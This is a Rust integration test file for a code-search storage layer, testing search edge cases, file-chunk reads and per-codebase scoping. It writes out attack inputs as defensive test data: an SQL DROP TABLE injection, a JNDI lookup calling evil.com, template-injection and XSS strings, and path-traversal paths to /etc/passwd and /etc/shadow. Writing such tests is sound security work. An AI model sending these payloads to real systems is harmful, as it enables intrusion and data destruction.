use kt::config::Config;
use kt::storage::Storage;
use kt::{Chunk, FileRole, Language};

async fn make_storage() -> Storage {
    let config = Config::from_env();
    let storage = Storage::new(&config).unwrap();
    storage.ensure_index().await.unwrap();
    storage
}

#[tokio::test]
async fn test_empty_query() {
    let storage = make_storage().await;
    let result = storage.hybrid_search(&vec![0.0f32; 384], "", None, 3).await;
    match result {
        Ok(results) => {
            assert!(results.len() <= 3, "empty query should respect top_k");
            eprintln!("PASS: empty query returned {} results", results.len());
        }
        Err(e) => panic!("FAIL: empty query crashed: {e}"),
    }
}

#[tokio::test]
async fn test_whitespace_only_query() {
    let storage = make_storage().await;
    let result = storage
        .hybrid_search(&vec![0.0f32; 384], "   \t\n  ", None, 3)
        .await;
    match result {
        Ok(results) => eprintln!("PASS: whitespace query returned {} results", results.len()),
        Err(e) => panic!("FAIL: whitespace query crashed: {e}"),
    }
}

#[tokio::test]
async fn test_zero_top_k() {
    let storage = make_storage().await;
    let result = storage
        .hybrid_search(&vec![0.0f32; 384], "function", None, 0)
        .await;
    match result {
        Ok(results) => {
            assert!(results.is_empty(), "top_k=0 should return empty results");
            eprintln!("PASS: top_k=0 returned empty");
        }
        Err(e) => panic!("FAIL: top_k=0 crashed: {e}"),
    }
}

#[tokio::test]
async fn test_huge_top_k() {
    let storage = make_storage().await;
    let result = storage
        .hybrid_search(&vec![0.0f32; 384], "function", None, 10000)
        .await;
    match result {
        Ok(results) => eprintln!("PASS: huge top_k returned {} results", results.len()),
        Err(e) => panic!("FAIL: huge top_k crashed: {e}"),
    }
}

#[tokio::test]
async fn test_special_chars_in_query() {
    let storage = make_storage().await;
    let nasty_queries: Vec<&str> = vec![
        "'; DROP TABLE chunks; --",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
        "<script>alert('xss')</script>",
        "fn foo() { let x = \"hello\"; }",
        "a\x00b\x01c",
        "query with \"quotes\" and 'apostrophes'",
        "back\\slash",
        "query:with:colons",
        "query(with)parens",
        "query{with}braces",
        "query|with|pipes",
        "query@with@ats",
        "query!with!bangs",
        "query-with-dashes",
        "query*with*wildcards",
        "query[with]brackets",
    ];
    for q in nasty_queries {
        let result = storage.hybrid_search(&vec![0.0f32; 384], q, None, 3).await;
        match result {
            Ok(results) => {
                let display = &q[..q.len().min(40)];
                eprintln!(
                    "PASS: special char query {:?} returned {} results",
                    display,
                    results.len()
                );
            }
            Err(e) => panic!(
                "FAIL: special char query {:?} crashed: {e}",
                &q[..q.len().min(40)]
            ),
        }
    }
}

#[tokio::test]
async fn test_read_nonexistent_file() {
    let storage = make_storage().await;
    let result = storage.read_file_chunks("nonexistent_file.rs").await;
    match result {
        Ok(results) => {
            assert!(results.is_empty(), "nonexistent file should return empty");
            eprintln!("PASS: nonexistent file returned empty");
        }
        Err(e) => panic!("FAIL: nonexistent file crashed: {e}"),
    }
}

#[tokio::test]
async fn test_read_path_traversal() {
    let storage = make_storage().await;
    let traversal_paths: Vec<&str> = vec![
        "../../../etc/passwd",
        "/etc/shadow",
        "src/../../../etc/hosts",
    ];
    for path in traversal_paths {
        let result = storage.read_file_chunks(path).await;
        match result {
            Ok(results) => {
                assert!(
                    results.is_empty(),
                    "path traversal {:?} should return empty",
                    path
                );
                eprintln!("PASS: path traversal {:?} returned empty (safe)", path);
            }
            Err(e) => panic!("FAIL: path traversal {:?} crashed: {e}", path),
        }
    }
}

#[tokio::test]
async fn test_read_wildcard_path() {
    let storage = make_storage().await;
    let result = storage.read_file_chunks("src/*.rs").await;
    match result {
        Ok(results) => {
            assert!(results.is_empty(), "wildcard should not match");
            eprintln!("PASS: wildcard path returned {} results", results.len());
        }
        Err(e) => panic!("FAIL: wildcard path crashed: {e}"),
    }
}

#[tokio::test]
async fn test_read_empty_path() {
    let storage = make_storage().await;
    let result = storage.read_file_chunks("").await;
    match result {
        Ok(results) => eprintln!("PASS: empty path returned {} results", results.len()),
        Err(e) => panic!("FAIL: empty path crashed: {e}"),
    }
}

#[tokio::test]
async fn test_language_filter() {
    let storage = make_storage().await;
    let result = storage
        .hybrid_search(&vec![0.0f32; 384], "function", Some(&kt::Language::Rust), 3)
        .await;
    match result {
        Ok(results) => {
            for r in &results {
                assert_eq!(
                    r.language,
                    kt::Language::Rust,
                    "language filter should work"
                );
            }
            eprintln!(
                "PASS: language filter returned {} rust results",
                results.len()
            );
        }
        Err(e) => panic!("FAIL: language filter crashed: {e}"),
    }
}

#[tokio::test]
async fn test_long_query() {
    let storage = make_storage().await;
    let long_query = "x".repeat(100_000);
    let result = storage
        .hybrid_search(&vec![0.0f32; 384], &long_query, None, 3)
        .await;
    match result {
        Ok(results) => eprintln!("PASS: 100k char query returned {} results", results.len()),
        Err(e) => panic!("FAIL: 100k char query crashed: {e}"),
    }
}

#[tokio::test]
async fn test_long_filepath() {
    let storage = make_storage().await;
    let long_path = "src/".to_string() + &"a".repeat(10_000) + ".rs";
    let result = storage.read_file_chunks(&long_path).await;
    match result {
        Ok(results) => eprintln!("PASS: 10k char filepath returned {} results", results.len()),
        Err(e) => panic!("FAIL: 10k char filepath crashed: {e}"),
    }
}

#[tokio::test]
async fn test_remove_nonexistent_file() {
    let storage = make_storage().await;
    let result = storage
        .remove_file_chunks("this_file_does_not_exist.rs")
        .await;
    match result {
        Ok(count) => {
            assert_eq!(count, 0, "removing nonexistent file should return 0");
            eprintln!("PASS: remove nonexistent file returned 0");
        }
        Err(e) => panic!("FAIL: remove nonexistent file crashed: {e}"),
    }
}

#[tokio::test]
async fn test_unicode_query() {
    let storage = make_storage().await;
    let unicode_queries: Vec<&str> = vec![
        "\u{95a2}\u{6570}",
        "\u{444}\u{443}\u{43d}\u{43a}\u{446}\u{438}\u{44f}",
        "\u{1f50d}search",
        "\u{4f60}\u{597d}",
    ];
    for q in unicode_queries {
        let result = storage.hybrid_search(&vec![0.0f32; 384], q, None, 3).await;
        match result {
            Ok(results) => eprintln!(
                "PASS: unicode query {:?} returned {} results",
                q,
                results.len()
            ),
            Err(e) => panic!("FAIL: unicode query {:?} crashed: {e}", q),
        }
    }
}

#[tokio::test]
async fn test_newlines_in_filepath() {
    let storage = make_storage().await;
    let result = storage.read_file_chunks("src/lib.rs\nmalicious").await;
    match result {
        Ok(results) => eprintln!(
            "PASS: newline in filepath returned {} results",
            results.len()
        ),
        Err(e) => panic!("FAIL: newline in filepath crashed: {e}"),
    }
}

fn test_chunk(filepath: &str, name: &str, start_line: usize, end_line: usize) -> Chunk {
    test_chunk_in_codebase("adversarial-codebase", filepath, name, start_line, end_line)
}

fn test_chunk_in_codebase(
    codebase_id: &str,
    filepath: &str,
    name: &str,
    start_line: usize,
    end_line: usize,
) -> Chunk {
    Chunk {
        chunk_id: Chunk::generate_id(codebase_id, filepath, name, start_line),
        codebase_id: codebase_id.to_string(),
        filepath: filepath.to_string(),
        language: Language::Rust,
        node_type: "function".to_string(),
        name: name.to_string(),
        signature: format!("fn {name}()"),
        content: format!("fn {name}() {{}}"),
        parent_context: None,
        start_line,
        end_line,
        file_role: FileRole::Implementation,
        calls: Vec::new(),
    }
}

#[tokio::test]
async fn test_read_file_chunks_returns_source_order_with_line_ranges() {
    let storage = make_storage().await;
    let filepath = "tests/fixtures/read_file_out_of_order.rs";
    let _ = storage.remove_file_chunks(filepath).await;

    let chunks = vec![
        test_chunk(filepath, "third", 20, 24),
        test_chunk(filepath, "first", 0, 4),
        test_chunk(filepath, "second", 10, 14),
    ];
    let embeddings = vec![vec![0.0f32; 384]; chunks.len()];

    storage
        .store_chunks_batch(&chunks, &embeddings, None)
        .await
        .unwrap();

    let results = storage.read_file_chunks(filepath).await.unwrap();
    let names = results
        .iter()
        .map(|result| result.name.as_str())
        .collect::<Vec<_>>();
    let ranges = results
        .iter()
        .map(|result| (result.start_line, result.end_line))
        .collect::<Vec<_>>();

    assert_eq!(names, vec!["first", "second", "third"]);
    assert_eq!(
        ranges,
        vec![
            (Some(0), Some(4)),
            (Some(10), Some(14)),
            (Some(20), Some(24))
        ]
    );

    storage.remove_file_chunks(filepath).await.unwrap();
}

#[tokio::test]
async fn test_read_shadow_file_chunks_returns_source_order_with_line_ranges() {
    let storage = make_storage().await;
    let suffix = fastrand::u64(..);
    let codebase_id = format!("shadow-read-file-order-{suffix}");
    let filepath = format!("tests/fixtures/shadow_read_file_out_of_order_{suffix}.rs");

    let chunks = vec![
        test_chunk_in_codebase(&codebase_id, &filepath, "third", 20, 24),
        test_chunk_in_codebase(&codebase_id, &filepath, "first", 0, 4),
        test_chunk_in_codebase(&codebase_id, &filepath, "second", 10, 14),
    ];
    let embeddings = vec![vec![0.0f32; 384]; chunks.len()];

    storage
        .store_shadow_chunks_batch(&chunks, &embeddings, 30)
        .await
        .unwrap();

    let results = storage.read_shadow_file_chunks(&filepath).await.unwrap();
    let names = results
        .iter()
        .map(|result| result.name.as_str())
        .collect::<Vec<_>>();
    let ranges = results
        .iter()
        .map(|result| (result.start_line, result.end_line))
        .collect::<Vec<_>>();

    assert_eq!(names, vec!["first", "second", "third"]);
    assert_eq!(
        ranges,
        vec![
            (Some(0), Some(4)),
            (Some(10), Some(14)),
            (Some(20), Some(24))
        ]
    );
}

#[tokio::test]
async fn test_same_file_and_symbol_are_scoped_by_codebase() {
    let storage = make_storage().await;
    let suffix = fastrand::u64(..);
    let codebase_a = format!("test-codebase-a-{suffix}");
    let codebase_b = format!("test-codebase-b-{suffix}");
    let filepath = format!("tests/fixtures/multi_codebase_{suffix}/src/lib.rs");

    let chunks = vec![
        test_chunk_in_codebase(&codebase_a, &filepath, "shared_symbol", 0, 4),
        test_chunk_in_codebase(&codebase_b, &filepath, "shared_symbol", 0, 4),
    ];
    let embeddings = vec![vec![0.0f32; 384]; chunks.len()];

    storage
        .store_chunks_batch(&chunks, &embeddings, None)
        .await
        .unwrap();

    let global = storage.read_file_chunks(&filepath).await.unwrap();
    assert_eq!(global.len(), 2, "global read should return both codebases");

    let scoped_a = storage
        .read_file_chunks_scoped(&filepath, Some(&codebase_a))
        .await
        .unwrap();
    let scoped_b = storage
        .read_file_chunks_scoped(&filepath, Some(&codebase_b))
        .await
        .unwrap();
    assert_eq!(scoped_a.len(), 1);
    assert_eq!(scoped_b.len(), 1);
    assert_eq!(scoped_a[0].codebase_id, codebase_a);
    assert_eq!(scoped_b[0].codebase_id, codebase_b);
    assert_ne!(scoped_a[0].chunk_id, scoped_b[0].chunk_id);

    let removed = storage
        .remove_file_chunks_scoped(&codebase_a, &filepath)
        .await
        .unwrap();
    assert_eq!(removed, 1);

    let remaining = storage.read_file_chunks(&filepath).await.unwrap();
    assert_eq!(remaining.len(), 1);
    assert_eq!(remaining[0].codebase_id, codebase_b);

    storage
        .remove_file_chunks_scoped(&codebase_b, &filepath)
        .await
        .unwrap();
}

#[tokio::test]
async fn test_file_mtimes_are_scoped_by_codebase() {
    let storage = make_storage().await;
    let suffix = fastrand::u64(..);
    let codebase_a = format!("mtime-codebase-a-{suffix}");
    let codebase_b = format!("mtime-codebase-b-{suffix}");
    let filepath = format!("tests/fixtures/mtime_{suffix}/src/lib.rs");

    let chunks = vec![
        test_chunk_in_codebase(&codebase_a, &filepath, "mtime_symbol", 0, 4),
        test_chunk_in_codebase(&codebase_b, &filepath, "mtime_symbol", 0, 4),
    ];
    let embeddings = vec![vec![0.0f32; 384]; chunks.len()];
    let mtimes = vec!["111".to_string(), "222".to_string()];

    storage
        .store_chunks_batch(&chunks, &embeddings, Some(&mtimes))
        .await
        .unwrap();

    let mtimes_a = storage.get_file_mtimes(Some(&codebase_a)).await.unwrap();
    let mtimes_b = storage.get_file_mtimes(Some(&codebase_b)).await.unwrap();
    assert_eq!(mtimes_a.get(&filepath).map(String::as_str), Some("111"));
    assert_eq!(mtimes_b.get(&filepath).map(String::as_str), Some("222"));

    storage
        .remove_file_chunks_scoped(&codebase_a, &filepath)
        .await
        .unwrap();
    storage
        .remove_file_chunks_scoped(&codebase_b, &filepath)
        .await
        .unwrap();
}

#[tokio::test]
async fn test_codebase_alias_registration_and_resolution() {
    let storage = make_storage().await;
    let suffix = fastrand::u64(..);
    let alias = format!("alias-{suffix}");
    let other_alias = format!("other-alias-{suffix}");
    let dir_a = tempfile::tempdir().unwrap();
    let dir_b = tempfile::tempdir().unwrap();

    let codebase = storage
        .register_codebase(dir_a.path(), Some(&alias))
        .await
        .unwrap();

    let by_alias = storage
        .resolve_codebase(None, Some(&alias))
        .await
        .unwrap()
        .unwrap();
    let by_path = storage
        .resolve_codebase(Some(dir_a.path()), None)
        .await
        .unwrap()
        .unwrap();
    assert_eq!(by_alias.codebase_id, codebase.codebase_id);
    assert_eq!(by_path.codebase_id, codebase.codebase_id);
    assert_eq!(by_alias.alias.as_deref(), Some(alias.as_str()));

    let duplicate = storage.register_codebase(dir_b.path(), Some(&alias)).await;
    assert!(
        duplicate
            .unwrap_err()
            .to_string()
            .contains("already points"),
        "duplicate alias should produce a clear error"
    );

    storage
        .register_codebase(dir_b.path(), Some(&other_alias))
        .await
        .unwrap();
    let mismatch = storage
        .resolve_codebase(Some(dir_b.path()), Some(&alias))
        .await;
    assert!(
        mismatch
            .unwrap_err()
            .to_string()
            .contains("directory_path resolves"),
        "path/alias mismatch should produce a clear error"
    );
}

#[tokio::test]
async fn test_concurrent_codebase_alias_registration_allows_only_one_owner() {
    let storage = make_storage().await;
    let alias = format!("concurrent-alias-{}", fastrand::u64(..));
    let dirs = (0..64)
        .map(|_| tempfile::tempdir().unwrap())
        .collect::<Vec<_>>();

    let mut tasks = Vec::new();
    for dir in &dirs {
        let storage = storage.clone();
        let alias = alias.clone();
        let path = dir.path().to_path_buf();
        tasks.push(tokio::spawn(async move {
            storage
                .register_codebase(&path, Some(&alias))
                .await
                .map(|codebase| codebase.codebase_id)
        }));
    }

    let mut successful_ids = Vec::new();
    for task in tasks {
        if let Ok(Ok(id)) = task.await {
            successful_ids.push(id);
        }
    }
    successful_ids.sort();
    successful_ids.dedup();

    assert_eq!(
        successful_ids.len(),
        1,
        "only one codebase may claim a concurrently registered alias"
    );

    let listed = storage.list_codebases().await.unwrap();
    let aliases = listed
        .iter()
        .filter(|codebase| codebase.alias.as_deref() == Some(alias.as_str()))
        .collect::<Vec<_>>();
    assert_eq!(
        aliases.len(),
        1,
        "registry must not contain duplicate codebase hashes with the same alias"
    );
    assert_eq!(aliases[0].codebase_id, successful_ids[0]);
}
